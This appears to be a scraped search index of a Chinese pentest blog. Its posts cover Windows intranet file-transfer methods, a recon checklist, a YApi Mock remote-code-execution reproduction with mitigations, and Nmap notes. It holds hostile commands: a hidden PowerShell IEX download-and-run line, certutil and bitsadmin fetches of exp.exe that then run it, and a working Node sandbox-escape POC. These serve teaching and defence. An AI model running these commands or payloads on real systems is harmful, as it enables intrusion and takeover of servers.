Windows篇","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil.exe、bitsadmin、Xcopy，都是些老技术，整理分享。 ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:0:0","tags":["pentest","RedTeam","内网渗透"],"title":"005-内网文件传输技术 Windows篇","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"一、ftp windows 全平台自带ftp，在实战中需要考虑两点。 数据传输的完整性。 代码精简 ftp文件的传输方式： Binary，二进制方式； ASCII，ASCII传输 在FTP文件传输过程中，ASCII传输HTML和文本编写的文件，而二进制码传输可以传送文本和非文本（执行文件，压缩文件，图片等），具有通用性，二进制码传输速度比ASCII传输要快。 命令： echo open 192.168.1.115 21\u003e ftp.txt echo 123\u003e\u003e ftp.txt # 用户名 echo 123\u003e\u003e ftp.txt # 密码 echo binary \u003e\u003e ftp.txt # bin模式，设置二进制传输类型 echo get robots.txt \u003e\u003e ftp.txt # 接收指定文件 echo bye \u003e\u003e ftp.txt # 终止ftp会话并退出，同quit # 指定包含 FTP 命令的文本文件；命令在 FTP 启动后自动运行。 ftp -s:ftp.txt del /F /Q ftp.txt # 安静模式强制删除ftp文件 精简成一句话 echo open IP \u003e o\u0026echo user UserName Password \u003e\u003e o \u0026echo get Target_File.exe \u003e\u003e o \u0026echo quit \u003e\u003e o \u0026ftp ‐n ‐s:o \u0026del /F /Q o # -A匿名登录下载文件 echo open IP \u003e o \u0026 echo get Target_File.exe \u003e\u003e o \u0026echo quit\u003e\u003eo \u0026ftp -A -n -s:o \u0026 del /F /Q o ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:1:0","tags":["pentest","RedTeam","内网渗透"],"title":"005-内网文件传输技术 Windows篇","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"二、VBS 编写VBS脚本并保存 set a=createobject(\"adod\"+\"b.stream\"):set w=createobject(\"micro\"+\"soft.xmlhttp\"):w.open\"get\",wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 也可以用echo方式写入vbs echo set a=createobject(^\"adod^\"+^\"b.stream^\"):set w=createobject(^\"micro^\"+^\"soft.xmlhttp^\"):w.open ^\"get^\",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 \u003e\u003e downfile.vbs 命令行下载 cscript downfile.vbs http://192.168.126.130:8000/flag.txt C:\\Inetpub\\b.txt 也可以把参数直接写入vbs文件中，直接执行。 优点：支持windows全版本系列缺点：对https不友好 VBS作为一门代码语言，可以有多种代码编写的方式，不只这一种 ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:2:0","tags":["pentest","RedTeam","内网渗透"],"title":"005-内网文件传输技术 Windows篇","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"三、Powershell # 远程下载文件到本地： powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.183.138:8000/test.txt','test.exe') powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://192.168.111.1:8080/exp.exe','C:\\Users\\1day\\Desktop\\Tools\\exp.exe') exp.exe # 直接把文本转换为exe文件运行，无残留文件 powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.183.138:8000/test.txt'))\" ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:3:0","tags":["pentest","RedTeam","内网渗透"],"title":"005-内网文件传输技术 Windows篇","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"四、certutil Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。 certutil.exe -urlcache -split -f http://192.168.16.157/exp.exe # certutil.exe下载有个弊端，它的每一次下载都有留有缓存，所以每次下载后需要清除缓存 certutil.exe -urlcache -split -f http://192.168.16.157/exp.exe delete //删除缓存 exp.exe -URLCache -- 显示或删除 URL 缓存项目 -split -- 分离嵌入的 ASN.1 元素，并保存到文件 -f -- 强制覆盖 默认下载为bin文件。但是不影响在命令行下使用。 certutil还自带base64编码解码功能 certutil -encode c:\\downfile.vbs downfile.bat certutil -decode c:\\downfile.bat downfile.txt ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:4:0","tags":["pentest","RedTeam","内网渗透"],"title":"005-内网文件传输技术 Windows篇","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"五、bitsadmin BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度。 具体相关参数参见 官方文档： USAGE: BITSADMIN [/RAWRETURN] [/WRAP | /NOWRAP] command The following commands are available: /? Prints this help /UTIL /? 打印实用程序命令列表 /PEERCACHING /? 打印管理缓存的命令列表 /CACHE /? 打印缓存管理命令 /PEERS /? 打印管道peer管理命令 /LIST [/ALLUSERS] [/VERBOSE] 打印任务列表 /MONITOR [/ALLUSERS] [/REFRESH sec] 监控复制管理器 /RESET [/ALLUSERS] 删除所有任务 /TRANSFER \u003cjob name\u003e [type] [/PRIORITY priority] [/ACLFLAGS flags] remote_url local_name 传输一个或多个文件. [type] 为/DOWNLOAD或/UPLOAD; 默认为下载 可以指定多个 URL/文件对。local_name 只支持 绝对路径 bitsadmin /transfer 123 http://192.168.111.1:8080/exp.exe C:\\Users\\1day\\Desktop\\exp.exe net use \\\\DC\\admin$ /u:\"administrator\" \" 1qaz@WSX\" bitsadmin /TRANSFER /DOWNLOAD \\\\WEB\\admin$\\temp\\t.exe C:\\windows\\temp\\t.exe bitsadmin /TRANSFER /UPLOAD c:\\windows\\temp\\t.exe \\\\WEB\\admin$\\temp\\t.exe bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自 动重试，在比较复杂的网络环境下，有着不错的性能。 E:\\\u003ebitsadmin /rawreturn /transfer down \"http://192.168.1.115/robots.txt\" E:\\PDF\\robots.txt /RAWRETURN 返回数据更适合解析 需要注意的是，bitsadmin要求服务器支持Range标头。如果需要下载过大的文件，需要提高优先级。配合上面的下载命令。再次执行 bitsadmin /setpriority down foreground /SETPRIORITY \u003cjob\u003e \u003cpriority\u003e # 设置工作优先级 Priority usage choices: FOREGROUND HIGH NORMAL LOW ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:5:0","tags":["pentest","RedTeam","内网渗透"],"title":"005-内网文件传输技术 Windows篇","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"六 、Xcopy Windows 自带命令，复制文件和目录树 # 建立网络会话 net use \\\\DC\\admin$ /u:\"administrator\" \"password\" # 从本地推到远端 xcopy /s /h /d /c /y C:\\Windows\\Temp\\t.exe \\\\WEB\\\\admin$\\temp\\ # 从远端拉到本地 xcopy /s /h /d /c /y \\\\WEB\\\\admin$\\temp\\t.exe C:\\Windows\\Temp\\ 参数讲解： XCOPY source [destination] source 指定要复制的文件。 destination 指定新文件的位置和/或名称。 /S 复制目录和子目录，不包括空目录。 /H 也复制隐藏文件和系统文件。 /D:m-d-y 复制在指定日期或指定日期以后更改的文件。如果没有提供日期，只复制那些源时间比目标时间新的文件。 /C 即使有错误，也继续复制。 /Y 取消提示以确认要覆盖现有目标文件。 ","date":"2021-11-13","objectID":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/:6:0","tags":["pentest","RedTeam","内网渗透"],"title":"005-内网文件传输技术 Windows篇","uri":"/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/"},{"categories":["Pentest"],"content":"国庆整理了一下内网的知识点，正在制作脑图，总体脑图太大了，先拆分出内网信息搜集部分脑图，后续的慢慢整理扩充。","date":"2021-10-07","objectID":"/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/","tags":["内网渗透","Pentest","RedTeam"],"title":"004-内网渗透 内网信息搜集脑图","uri":"/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/"},{"categories":["Pentest"],"content":"​ 国庆整理了一下内网的知识点，正在制作脑图，总体脑图太大了，先拆分出内网信息搜集部分脑图，后续的慢慢整理扩充。 进入内网后所关注的信息主要包括如下： 操作系统版本、主机信息、补丁信息 用户习惯、密码收集、社交软件收集、用户下载目录 用户列表，用户权限 端口列表 进程列表：关注杀毒软件、远程管理软件等 服务列表 网络连接：网络共享、会话信息、内网IP地址段信息等 域环境：域内主机，操作系统、应用软件、补丁、服务、杀毒软件一般都是批量安装的 整理如图： 字数不够，聊聊其他： 最近学习的有点迷茫，感觉前前后后学的东西也不少，但是总觉得缺少了灵活，不够融会贯通，想着多整理多写写东西是不是能得到新的收获。 纸上得来终觉浅，渗透是门实战的艺术，希望早日走出自己的一步。今天刚好看到了余弦师傅的文章《闲聊黑客成长路径》，希望能早日实现三大能力： 能挖好漏洞，手握好 0day； 能黑客工程化，手握好武器； 能玩好渗透，拿下目标为导向； 师傅们，一起加油吧！ ","date":"2021-10-07","objectID":"/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/:0:0","tags":["内网渗透","Pentest","RedTeam"],"title":"004-内网渗透 内网信息搜集脑图","uri":"/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/"},{"categories":["漏洞分析"],"content":"全文共计2314字，预计时长6分钟。 ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:0:0","tags":["漏洞分析","vuln"],"title":"003-Yapi Mock RCE 漏洞复现分析","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["漏洞分析"],"content":"0x01 基本信息 漏洞名称 : YAPI远程代码执行漏洞 组件名称 : YAPI 影响范围 : YAPI \u003c= 1.9.2， 漏洞类型 :远程代码执行 利用条件 : ​ 1、用户认证：需要用户认证 ​ 2、触发方式：远程 综合评价 : ​ \u003c综合评定利用难度\u003e：中等，需要用户认证。 ​ \u003c综合评定威胁等级\u003e：高危，能造成远程代码执行。 ​ YAPI是由去哪儿网移动架构组(简称YMFE，一群由FE、iOS和Android工程师共同组成的具想象力、创造力和影响力的大前端团队)开发的可视化接口管理工具，是一个可本地部署的、打通前后端及QA的接口管理平台。 ​ YAPI旨在为开发、产品和测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布和维护不同项目，不同平台的API。 ​ YApi 提供了编写JS 脚本方式来提供自定义mock功能，JS脚本运行在NodeJs沙盒上，由于官方的沙盒只是为了隔离上下文，并不提供任何安全保证；mock脚本自定义服务未对JS脚本加以命令过滤，用户可以添加任何请求处理脚本，攻击者可利用该漏洞在受影响的服务器上执行任意javascript代码，通过精心构造的Javascript代码可以绕过沙盒并用于执行任意系统命令，从而导致远程代码执行漏洞，最终导致接管并控制服务器。 由于Yapi管理平台默认开放注册，攻击者可以在进行简单的注册之后，构造恶意的JS代码绕过沙盒，最终造成远程代码执行进行漏洞利用。 ​ 问题的本质：功能滥用，JS沙箱绕过导致远程代码执行 ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:1:0","tags":["漏洞分析","vuln"],"title":"003-Yapi Mock RCE 漏洞复现分析","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["漏洞分析"],"content":"0x02 漏洞复现 fofa 搜索语句： icon_hash=\"-715193973\" app=“YApi” 本地复现： ​ Docker搭建测试环境，参考文档：《Yapi+Docker的安装与配置》 ​ 创建完容器之后就可以使用了。 在首页下方找到登录/注册功能接口，或直接访问 /login 路径进行登录和注册。 登录之后进入个人空间，在右侧点击添加项目； 添加成功后进入项目，点击右侧同一位置有个“添加接口” 添加完之后，打开接口，进入“高级Mock”功能，点击脚本，输入Poc，点击保存即可。 点击“预览”，访问Mock地址，即可触发漏洞POC。 POC如下： const process = this.constructor.constructor('return process')()mockJson = process.mainModule.require(\"child_process\").execSync(\"whoami\").toString() 点击“预览”，访问Mock地址，即可触发漏洞POC： ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:2:0","tags":["漏洞分析","vuln"],"title":"003-Yapi Mock RCE 漏洞复现分析","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["漏洞分析"],"content":"0x03 漏洞分析 ​ 这个漏洞的利用条件首先需要用户通过认证，而YAPI 支持任意用户的注册功能， ​ 注册之后的用户虽然没有任何分组与项目的权限，因此只能搜索、浏览 “公开项目” 的接口。但是新用户登录拥有 个人空间 分组下的全部权限，个人空间分组仅自己可见，因此可以在这里任意试用 YApi 的功能。 ​ 这里也就包括了高级Mock功能，该功能的本意是方便用户编写自己的JS脚本，该脚本将会运行在NodeJS沙盒上，但是NodeJS沙盒并不提供安全保证。关于JS沙箱的安全问题早有探讨。（见 《说说JS中的沙箱》——腾讯IVWEB团队） ​ NodeJS中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。 const vm = require('vm'); const x = 1; const sandbox = {x:2}; vm.createContext(sandbox); //Contextify the sandbox. const code = 'x += 40;var y=17;'; vm.runInContext(code,sandbox); console.log(sandbox.x); // 42 console.log(sandbox.y); // 17 console.log(x);// 1; y is not defined. ​ vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。 ​ 可惜的是 如果这样，我们可以用原型链绕过，如下 const vm = require('vm'); vm.runInNewContext(\"this.constructor.constructor('return process')().exit()\") ​ 网上关于NodeJS、沙箱一类的安全技术研究也有很多，可以参考下学一学。 ​ 回到这个漏洞，已知Mock脚本会在沙箱中运行，那么我们只需要利用类似上面的原型链进行绕过，退出沙箱，再构造调用命令即可。 Poc： const process = this.constructor.constructor('return process')() mockJson = process.mainModule.require(\"child_process\").execSync(\"whoami\").toString() ​ 注意，这里不需要加 exit，加了以后yapi服务会退出。 网上的Poc其实表达的意思是一样的，如下： const sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor('return process') const process = myfun() mockJson = process.mainModule.require(\"child_process\").execSync(\"whoami\").toString() 我认为这个问题的本质是功能的滥用，JS沙箱绕过导致远程代码执行。之前看了一个文档《nodejs命令执行和沙箱安全》，他所说的内容有对也有不对的地方。 ​ 作者认为这是一个正常的功能， “很多安全人员没深入开发或者是结合到sdl中，所以对这些需求的理解不深刻。那么假设我们要执行这个需求，这个需求就是要执行任意命令，因为业务会有千奇百怪的需求，前端nodejs就要执行命令来测试的。”，我虽然也是脱离业务的安全人员，但也相信确实存在各种乱七八糟的需求，执行命令也确实有它的客观需要。 ​ 但文章作者认为这个正常的功能，不需要修复，我觉得不对。 ​ Mock 提供的JS脚本确实是正常的功能，但是不是真的需要给任何人都开放这个权限呢？ ​ 我认为这是一个功能的滥用，Mock的初衷是好的，但是却容易导致被攻击者恶意利用，造成的危害是重大的。安全是一门平衡的艺术，是为了保障业务持续稳定安全的运行。这次的问题还是侧重在用户权限上，官方允许新用户登录拥有 个人空间 分组下的全部权限，可以在这里任意试用 YApi 的功能，这样任何人都可以运行Mock脚本，继而间接导致任何人都可以控制服务器权限，这是存在安全隐患的。 ​ 我认为或许可以进行平衡，限制普通用户的权限，只允许可信的人来操作，对权限进行完善划分，对于可以控制服务器、执行系统命令的这些高危操作应当予以限制等。 ​ 不过，这也这是一个脱离业务的安全人员的粗浅想法，要根据实际进行处理。 ​ 感觉又是一个蜜罐素材？ ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:3:0","tags":["漏洞分析","vuln"],"title":"003-Yapi Mock RCE 漏洞复现分析","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["漏洞分析"],"content":"0x04 威胁排查 1、使用管理员账号登录YAPI，在用户管理中排查并删除异常用户。 2、通过关键字（process、exec、require等），在adv_mock集合的mock_script域中搜索是否存在恶意的javascript脚本。 db.adv_mock.find({mock_script: /exec/}); 出自：《【处置手册】YAPI远程代码执行0day漏洞》 ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:4:0","tags":["漏洞分析","vuln"],"title":"003-Yapi Mock RCE 漏洞复现分析","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["漏洞分析"],"content":"0x05 缓解措施 目前官方暂未针对该漏洞发布修复方案，请受影响的用户参考下列措施进行防护：1、关闭YAPI用户注册功能 在 config.json 中添加以下配置项，禁止用户注册或启用LDAP认证： { \"closeRegister\":true } 修改完成后，重启 YAPI 服务生效。 2、关闭YAPI Mock功能 1)、在config.json中新增mock: false参数： { ... \"mock\": false, } 2)、在exts/yapi-plugin-andvanced-mock/server.js文件中找到： if (caseData \u0026\u0026 caseData.case_enable) {...} 并添加下列代码： if(!yapi.WEBCONFIG.mock) { return false; } 3、对高级Mock功能进行关键字过滤 在/server/utils/commons.js文件中找到： sandbox = yapi.commons.sandbox(sandbox, script); 并添加下列代码： const filter = '/process|exec|require/g'; const reg = new RegExp(filter, \"g\"); if(reg.test(script)) { return false; } 4、对YAPI平台的访问进行限制 利用请求白名单的方式限制 YAPI 相关端口 5、修改管理员默认账号口令，清除弱口令。 6、检查删除恶意账户 及时检查删除恶意账户，同步删除恶意用户创建的接口以及他们上传的恶意mock脚本以防止二次攻击。 ","date":"2021-07-12","objectID":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/:5:0","tags":["漏洞分析","vuln"],"title":"003-Yapi Mock RCE 漏洞复现分析","uri":"/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"},{"categories":["Tools"],"content":"Nmap 进阶学习心得","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x00 引 ​ 说起端口扫描，你可以举出一大堆的工具，但有一款神器，一定是登场率最高的，那就是Nmap。作为最为大众所熟悉的工具，相信大家都“熟练掌握”了Nmap的使用技巧，我曾经也是那么认为的，直到我看到了官方出版书刊《Nmap Network Scanning》（电子稿，简称NNS），才知道原来自己一直只是“会用”而已。 ​ 首先，我们来提出一些问题，如果能清楚回答下列问题，那么恭喜你不用浪费30分钟阅读本文了，问题如下： Nmap支持哪些功能选项？ Nmap的执行过程是怎么样的？ Nmap 包含了哪些默认选项？如执行了哪些探测技术等 Nmap有哪些端口探测技术，有什么区别？ Nmap的扫描速度慢一直被人诟病，有什么方法可以加速吗？ ​ 有关Nmap的文章网络上已经很多了，大多数人可能已经看过了不少了，所以有些简单的地方我会一笔带过，大家网上搜索一下，也许会获得更多的知识碰撞。既然网上文章那么多，我为什么还要写呢？首先也是主要目的，是记录自己的学习心得，推动促进自己成长；其次是我发现网上很多文章只是简单的列举了Nmap的功能选项，罗列了一堆却没有深入去说明这些选项的注意事项，因此会造成很多的误解和错误使用，例如：有一个选项 -Pn，用于跳过主机发现阶段， 默认目标主机在线，整个流程少进行一个阶段，这样扫描速度就会加快了吧？（真的么？:D）；还有也是类似的，有些文章给出了应对各种场景的Nmap指令，如果不去了解那些指令就盲目的照搬，那么你可能被文章作者的“笔误”所误导。啰嗦了一堆，我们开始吧！ ​ Nmap功能选项可以查看 Nmap -h ，我这里就不一条条去说了，下文涉及到时再说。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:1:0","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x01. 指定扫描目标 ​ 首先，我打算从最简单的Nmap的命令案例讲起：nmap 192.168.1.1。通常绝大多数人使用Nmap时，都是需要针对特定的目标进行扫描的，所以就先来说说Nmap指定扫描目标的几种方式。猜猜以下哪些目标格式是能够被nmap解析的呢？ 192.168.1.1 192.168.1.2 192.168.1.1,2,3 192.168.1.1/28 192.168.1.- 192.168.2-3.1-255 192.168.1.250- 192.168.1.-20 192.168.3-5,7.1 scanme.nmap.org scanme.nmap.org/32 -.-.1.1 0-.0.255.13.37 2001:800:40:2a03::3 ​ 答案是除了-.-.1.1以外，都可以作为目标输入。Nmap支持域名形式；支持CIDR寻址（从/0全网到/32当前IP）；支持IPv6地址，但需要指定选项-6来开启IPv6支持。 ​ 连字符（-）表示从0-255，当指定从0开始，或到255结束时，可以省略0和255。那么为什么-.-.1.1不可以呢？因为直接以连字符（-）开头，Nmap会将它视为一个功能选项解析，而不是作为目标地址。 ​ Nmap在命令行上可以同时接受多个主机作为目标，而且不要求是统一类型的，如：nmap scanme.nmap.org 192.168.0.0/8 10.0.0,1,3-7.- （注意：不包括Ipv6，Ipv6和Ipv4不能同时启用）。多个主机之间由一个或多个空格分隔。 ​ -iL ​ Nmap 还支持从文件列表中读取目标，功能选项为 -iL ，同样也支持上述格式，由一个或多个空格，制表符或换行符分隔。 ​ 此外Nmap还支持从标准输入中读取目标主机列表，可使用连字符（-）作为 -iL 的文件名，例如： ​ sort -u IpList.txt | nmap -iL - ​ egrep'^ lease'/var/lib/dhcp/dhcpd.leases | awk'{print $ 2}'| nmap -iL- --exclude 和 --excludefile \u003cfilename\u003e ​ 排除扫描目标有两个功能选项：--exclude 和 --excludefile \u003cfilename\u003e，很明显后者是从文件中读取需排除的扫描目标，就不细说了。 ​ 这里有一个注意事项：–exclude 功能选项后面接的参数是用逗号分隔的，因此不支持192.168.1.10,20,30来指定排除IP ​ -iR ​ 其实，除了指定目标进行扫描之外，Nmap还支持漫无目的的全网扫描，功能选项为-iR \u003cnumber\u003e，表示从全网中随机选择指定 number 个主机进行扫描，如果number为0，表示持续扫描直到用户终止，-iR 这个功能一般很少会用到。 ​ -sL ​ 光看不验证容易被骗，如何快速的验证呢，去试一下 -sL 选项吧，它会列出进行扫描的目标清单，而不进行扫描，通常就是用于排查待扫描的目标是否准确。 ​ 我们可以看到IP段能对上，对域名目标，Nmap进行了域名解析和反向DNS，下文就将介绍Nmap的运行顺序了。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:2:0","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x02. Nmap运行流程 ​ Nmap的运行过程可见官方文档：https://nmap.org/book/nmap-phases.html ​ 一个简单的Nmap运行流程可以描述输入、主机发现、端口扫描、版本探测、操作系统探测、输出，如下图： ​ 一个完整的Nmap扫描流程就是：预扫描脚本加载，目标列举，主机发现，DNS反向解析，端口扫描，服务与版本探测，操作系统探测，网络路由监测，脚本扫描，结果输出，后扫描脚本加载。大意如图：（图源自网络，PS：这种图是拿什么做的，想修改几个地方） ​ 完整的流程如上所示，但很多流程提供了特定的功能选项来进行开启或跳过该阶段。接下来将介绍各个阶段的设计目，如何开启/关闭该阶段，以及该阶段的一些注意事项。 预扫描脚本（Script pre-scanning）：使用 --script 或 -sC功能选项开启Nmap脚本引擎时，当指定的脚本中存在相应脚本，才会执行这个阶段，默认不进行该阶段。该阶段实现的功能为指定脚本的功能。 目标枚举：这个阶段用于解析用户输入的目标，将域名、CIDR等解析为IP地址以供扫描，这是必不可少的一个阶段。-sL -n输出的结果就是这个阶段的输出结果。（-n 表示不进行反向DNS解析） 主机发现（ping扫描）：该阶段用于判断所指定的目标主机有哪些是在线的，同时还会收集与目标主机之间的网络状况，用于加速后续的端口扫描。这个阶段支持很多主机发现技术，并且是多种探针一同工作。这个阶段默认运行，可以使用-Pn 可以跳过主机发现阶段，默认目标主机在线。 反向DNS解析：Nmap会通过ping扫描发现所有在线主机的反向DNS名称，主机名称可能泄露该主机的功能用途。-n可以禁用反向解析，而 -R则表示对所有主机（即使不在线）也进行反向DNS解析。 端口扫描：Nmap的核心功能，用于获取端口的开放状态，支持多种扫描技术，但同一时间只能选择一种扫描技术探针进行探测，输出结果有六种：open、closed、filtered、unfiltered、open|filtered、closed|filtered。注意：这些状态不是端口本身真实状态，而是描述Nmap如何看待它们。不同的扫描技术得到的状态也不一样，需要学会了解其含义。默认执行，但-sn 可以跳过端口扫描功能 服务和版本探测：当识别到开放的端口时，可对该端口上运行的服务和版本进行探测。使用-sV启用版本探测。 操作系统检测：-O 开启主机操作系统检测。注意：操作系统检测到的系统可能与版本探测阶段扫描分析得出的系统不一致，能猜到是为什么吗？ 网络路由监测（Traceroute）：--traceroute 选项开启该功能。它可以使用之前阶段确定的最佳可用探测数据包，找到并行到达多个主机的网络路由。Traceroute 通常涉及中间主机的另一轮反向 DNS 解析。 脚本扫描：Nmap脚本引擎（NSE）中的脚本大部分运行在这一阶段。使用 --script 或-sC等选项启用此功能。Nmap支持6种类型的脚本，同时还允许高端玩家根据需求自己编写脚本，掌握Nmap 脚本扩展开发是很有帮助的。 结果输出：这一阶段Nmap会将其收集到的所有信息写入屏幕或文件。支持多种格式输出，默认是输出到屏幕。 后扫描脚本（Script post-scanning）：在 Nmap 完成扫描和正常输出后，此阶段的脚本可以处理结果并提供最终报告和统计信息。默认不包含任何脚本，也就相当于默认不进行这个阶段，只有在用户包含并执行他们自己的扫描后脚本时才会运行。同样也是使用 --script 等选项启用。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:3:0","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x03. 默认的选项技术 ​ Nmap 默认的选项技术，这里我们还是用 nmap 192.168.1.1/24 为例分析，在上文了解完运行流程之后，我们可以知道这条命令包含了目标列举、主机发现、反向DNS解析、端口扫描和结果输出这么5个阶段。 